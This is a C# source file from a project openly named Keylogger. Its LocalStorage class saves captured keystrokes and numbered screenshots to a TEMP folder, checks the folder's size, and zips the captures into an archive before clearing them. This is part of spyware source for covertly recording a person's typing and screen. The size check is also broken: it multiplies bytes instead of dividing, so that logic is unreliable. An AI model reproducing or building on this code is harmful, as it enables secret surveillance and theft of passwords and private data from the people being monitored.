using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Input;

namespace Keylogger
{
    /// <summary>
    /// This class manages gathered data on local computer
    /// </summary>
    public class LocalStorage
    {
        private int MaxSizeMB;
        private string BaseDirectory;
        private string KeysFile;
        private string BasicImageFile;



        /// <summary>
        /// Create instance of this class (what a surprise)
        /// </summary>
        /// <param name="maxSizeMB">Max size in MB for this storage. After reaching this limit, local storage will be considered as full.</param>
        public LocalStorage(int maxSizeMB)
        {
            MaxSizeMB = maxSizeMB;
            BaseDirectory = Path.Combine(Path.GetTempPath(), "KeyloggerTemp");
            KeysFile = Path.Combine(BaseDirectory, "Keys.log");
            BasicImageFile = Path.Combine(BaseDirectory, "ScreenSnapshot.png");

            Directory.CreateDirectory(BaseDirectory);
        }




        /// <summary>
        /// Saves given keys into file in TEMP
        /// </summary>
        /// <param name="keys">List of keys to store</param>
        public void SaveKeys(IEnumerable<Key> keys)
        {
            File.AppendAllLines(KeysFile, keys.Select(x => x.ToString()));
        }

        /// <summary>
        /// Saves given bitmap (image) as a PNG file in TEMP
        /// </summary>
        /// <param name="bitmap">Image to save</param>
        public void SaveScreenSnapshot(Bitmap bitmap)
        {
            bitmap.Save(NextImageFile(), ImageFormat.Png);
        }

        /// <summary>
        /// Determines whether storage is full. Threshold is passed into constructor.
        /// </summary>
        /// <returns>True if local storage is full</returns>
        public bool IsFull()
        {
            // Calculate directory size
            long sizeBytes = Directory.GetFiles(BaseDirectory, "*", SearchOption.AllDirectories).Sum(x => new FileInfo(x).Length);
            long sizeMB = sizeBytes * 1024 * 1024;

            return sizeMB > MaxSizeMB;
        }

        /// <summary>
        /// Packs file with captured keys and screen snapshots into a zip file.
        /// </summary>
        /// <returns>Path to the zip file</returns>
        public string PackToZip()
        {
            // Prepare place for ZIP
            string zipFile = Path.Combine(Path.GetTempPath(), "Archive.zip");
            if (File.Exists(zipFile))
                File.Delete(zipFile);

            // Create ZIP file
            ZipFile.CreateFromDirectory(BaseDirectory, zipFile);

            return zipFile;
        }

        /// <summary>
        /// Deletes captured keys and screen snapshots
        /// </summary>
        public void Clear()
        {
            foreach (string file in Directory.GetFiles(BaseDirectory))
                File.Delete(file);
        }



        /// <summary>
        /// Creates unique name for screenshot file
        /// </summary>
        /// <returns>Unique name for screenshot file</returns>
        private string NextImageFile()
        {
            int currentVersion = 1;
            string currentImageFile;

            do
                currentImageFile = BasicImageFile.AddVersion(currentVersion++);
            while (File.Exists(currentImageFile));

            return currentImageFile;
        }
    }
}
